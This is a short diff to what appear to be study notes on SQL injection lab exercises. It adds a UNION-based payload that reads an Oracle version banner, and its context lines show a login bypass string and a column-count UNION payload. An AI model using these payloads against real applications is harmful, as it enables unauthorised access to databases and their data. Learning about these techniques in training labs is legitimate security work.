@@ -53,6 +53,9 @@ password='+or'1'='1
 #### SQLI.03 - SQL injection UNION attack, determining the number of columns returned by the query
 
 ```
+/filter?category=Accessories' UNION SELECT banner, NULL FROM v$version-- 
+
+
 /filter?category=Accessories'+union+select+NULL,NULL,NULL--
 ```
 
